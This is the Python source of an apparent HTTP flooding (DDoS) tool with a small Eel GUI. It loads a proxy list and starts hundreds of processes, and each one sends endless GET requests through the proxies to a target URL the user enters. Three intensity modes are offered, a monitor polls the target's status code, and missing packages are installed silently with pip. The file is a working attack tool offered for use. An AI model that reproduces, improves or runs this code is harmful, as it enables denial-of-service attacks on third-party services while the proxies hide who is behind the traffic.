from multiprocessing import Process
import os
from time import sleep
import random

try:
	import requests
except:
	if os.name == 'nt':
		os.system('pip install requests')
	elif os.name == 'posix':
		os.system('pip3 install requests')
	try: 
		import requests
	except:
		if os.name == 'nt':
			os.abort()
		elif os.name == 'posix':
			quit()

try:
	import eel
except:
	if os.name == 'nt':
		os.system('pip install eel')
	elif os.name == 'posix':
		os.system('pip3 install eel')
	try: 
		import eel
	except:
		if os.name == 'nt':
			os.abort()
		elif os.name == 'posix':
			quit()

try:
	from cpuinfo import get_cpu_info
except:
	if os.name == 'nt':
		os.system('pip install py-cpuinfo')
	elif os.name == 'posix':
		os.system('pip3 install py-cpuinfo')
	try: 
		from cpuinfo import get_cpu_info
	except:
		if os.name == 'nt':
			os.abort()
		elif os.name == 'posix':
			quit()

eel.init("web")

with open('proxy.list') as plist:
	proxys = plist.read().split("\n")
random.shuffle(proxys)

def mode_one(ip : type('')):
	Count, i = 0, 0
	while Count <= 100:
		eel.set_status(f'{round(100 * Count / 100, 1)}%')
		temp = []
		for j in range(1, 20):
			temp.append(proxys[i + j])
		Process(target=dos, args=(temp, ip)).start()
		i += 20
		Count += 1
	sleep(0.1)

def mode_two(ip : type('')):
	Count, i = 0, 0
	while Count <= 200:
		eel.set_status(f'{round(100 * Count / 200, 1)}%')
		temp = []
		for j in range(1, 20):
			temp.append(proxys[i + j])
		Process(target=dos, args=(temp, ip)).start()
		i += 10
		Count += 1
	sleep(0.1)

def mode_three(ip : type('')):
	Count, i = 0, 0
	while Count <= 400:
		eel.set_status(f'{round(100 * Count / 400, 1)}%')
		temp = []
		for j in range(1, 20):
			temp.append(proxys[i + j])
		Process(target=dos, args=(temp, ip)).start()
		i += 10
		Count += 1
	sleep(0.1)

def dos(proxy : list, ip : type('')):
	try:
		while True:
			for p in proxy:
				requests.get(ip, proxies={ 'http' : 'http://' + p }, headers=requests.utils.default_headers())
	except KeyboardInterrupt:
		pass
	except:
		print('one of process stoped : fatal error')

def check(ip : type('')):
	while True: 
		eel.set_status('---')
		e = requests.get(ip, headers=requests.utils.default_headers())
		eel.set_status(e.status_code)
		sleep(2)
	#except:
	#	eel.set_status('ERR')

@eel.expose
def quit():
	os.abort()

@eel.expose
def ddos(mode, ip):
	if mode == 'small':
		mode_one(ip)
	elif mode == 'normal':
		mode_two(ip)
	elif mode == 'big':
		mode_three(ip)
	Process(target=check, args=(ip, )).start()

if __name__ == '__main__':
	eel.update(get_cpu_info()['count'], '---')
	eel.start("index.html", size=(375, 410))
	if os.name == 'nt':
		os.abort()
	elif os.name == 'posix':
		quit()